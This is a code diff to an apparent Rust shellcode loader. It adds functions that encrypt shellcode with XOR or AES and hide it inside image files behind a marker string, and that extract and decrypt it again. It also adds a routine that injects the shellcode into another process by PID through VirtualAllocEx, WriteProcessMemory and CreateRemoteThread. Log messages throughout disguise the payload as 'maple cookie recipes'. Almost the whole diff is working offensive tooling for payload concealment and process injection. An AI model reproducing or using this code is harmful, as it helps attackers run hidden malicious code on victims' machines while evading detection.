@@ -5,6 +5,12 @@ use std::fs::OpenOptions;
 use std::io::Write;
 use std::mem;
 
+extern crate kernel32;
+use std::ptr;
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
+
+use bstr::ByteSlice;
+
 use serde_derive::{Deserialize, Serialize};
 
 use aes_gcm::{
@@ -36,6 +42,9 @@ pub struct AESShellCode {
     pub key: Vec<u8>,
 }
 
+const SHELLCODE_EGG_THING: &[u8] =
+    b"you mirin mah shellcode brah? rust land best lang, c is for nerds";
+
 impl ShellCode {
     pub fn from_file(input_path: &str) -> ShellCode {
         let sc_object = match ShellCode::import_sc(input_path, "xor") {
@@ -44,6 +53,28 @@ impl ShellCode {
                 Ok(my_aes_object) => my_aes_object,
                 Err(_) => ShellCode::import_sc(input_path, "plain").unwrap(),
             },
+        };
+
+        sc_object
+    }
+
+    pub fn from_image(input_path: &str) -> ShellCode {
+        let input_file = match std::fs::read(input_path.clone()) {
+            Ok(result) => result,
+            Err(error) => {
+                println!("[+] shellcode path error {:?}", error);
+                std::process::exit(0x0100);
+            }
+        };
+
+        let result: Vec<Vec<u8>> = input_file
+            .split_str(&SHELLCODE_EGG_THING.clone().to_vec())
+            .map(|x| x.to_vec())
+            .collect();
+
+        let sc_object = match ShellCode::import_sc_image(result[1].clone(), "xor") {
+            Ok(my_xor_object) => my_xor_object,
+            Err(_) => ShellCode::import_sc_image(result[1].clone(), "aes").unwrap(),
         };
 
         sc_object
@@ -82,6 +113,24 @@ impl ShellCode {
         }
     }
 
+    pub fn import_sc_image(deserialized_sc: Vec<u8>, mode: &str) -> anyhow::Result<ShellCode> {
+        match mode {
+            "xor" => {
+                println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
+                let decoded_xor_object: XoredShellCode = bincode::deserialize(&deserialized_sc)?;
+                Ok(decoded_xor_object.xor())
+            }
+            "aes" => {
+                println!(
+                    "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
+                );
+                let decoded_aes_object: AESShellCode = bincode::deserialize(&deserialized_sc)?;
+                Ok(decoded_aes_object.decrypt())
+            }
+            &_ => todo!(),
+        }
+    }
+
     pub fn load(self) {
         let map =
             mmap_fixed::MemoryMap::new(self.sc.len(), &[MapReadable, MapWritable, MapExecutable])
@@ -97,6 +146,43 @@ impl ShellCode {
             let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
             println!("[+] commencer la recette des biscuits à l'érable");
             exec_shellcode();
+        }
+    }
+
+    pub fn load_createremotethread(self, pid: u32) {
+        unsafe {
+            let mut h = kernel32::OpenProcess(
+                PROCESS_ALL_ACCESS,
+                winapi::shared::ntdef::FALSE.into(),
+                pid.clone(),
+            );
+            println!("[+] opening process with PID {}", pid);
+            let mut addr = kernel32::VirtualAllocEx(
+                h,
+                ptr::null_mut(),
+                self.sc.len() as u64,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+            let mut n = 0;
+            kernel32::WriteProcessMemory(
+                h,
+                addr,
+                self.sc.as_ptr() as _,
+                self.sc.len() as u64,
+                &mut n,
+            );
+            let mut hThread = kernel32::CreateRemoteThread(
+                h,
+                ptr::null_mut(),
+                0,
+                Some(std::mem::transmute(addr)),
+                ptr::null_mut(),
+                0,
+                ptr::null_mut(),
+            );
+            println!("[+] commencer la recette des biscuits à l'érable");
+            kernel32::CloseHandle(h);
         }
     }
 }
@@ -171,6 +257,38 @@ impl XoredShellCode {
             "[+] a écrit une recette de cookies à l'érable cryptée XOR en {}",
             output_path
         );
+    }
+
+    pub fn output_to_image(self, output_pic_path: &str, input_pic: &str) {
+        let original_pic = match std::fs::read(input_pic) {
+            Ok(result) => result,
+            Err(error) => {
+                println!("[+] original pic error {:?}", error);
+                std::process::exit(0x0100);
+            }
+        };
+
+        let mut output_pic = match OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .open(output_pic_path)
+        {
+            Ok(result) => result,
+            Err(_error) => {
+                println!("[+] output path {} already exsists", output_pic_path);
+                std::process::exit(0x0100);
+            }
+        };
+
+        let serialized_self = bincode::serialize(&self).unwrap();
+
+        let mut final_vec = vec![];
+        final_vec.extend(original_pic);
+        final_vec.extend(SHELLCODE_EGG_THING.clone().to_vec());
+        final_vec.extend(serialized_self);
+        output_pic.write_all(&final_vec).unwrap();
+
+        println!("[*] you can 'mire the shellcode in {} now", output_pic_path);
     }
 }
 
@@ -250,5 +368,37 @@ impl AESShellCode {
             "[+] a écrit une recette de cookies à l'érable cryptée AES en {}",
             output_path
         );
+    }
+
+    pub fn output_to_image(self, output_pic_path: &str, input_pic: &str) {
+        let original_pic = match std::fs::read(input_pic) {
+            Ok(result) => result,
+            Err(error) => {
+                println!("[+] original pic error {:?}", error);
+                std::process::exit(0x0100);
+            }
+        };
+
+        let mut output_pic = match OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .open(output_pic_path)
+        {
+            Ok(result) => result,
+            Err(_error) => {
+                println!("[+] output path {} already exsists", output_pic_path);
+                std::process::exit(0x0100);
+            }
+        };
+
+        let serialized_self = bincode::serialize(&self).unwrap();
+
+        let mut final_vec = vec![];
+        final_vec.extend(original_pic);
+        final_vec.extend(SHELLCODE_EGG_THING.clone().to_vec());
+        final_vec.extend(serialized_self);
+        output_pic.write_all(&final_vec).unwrap();
+
+        println!("[*] you can 'mire the shellcode in {} now", output_pic_path);
     }
 }
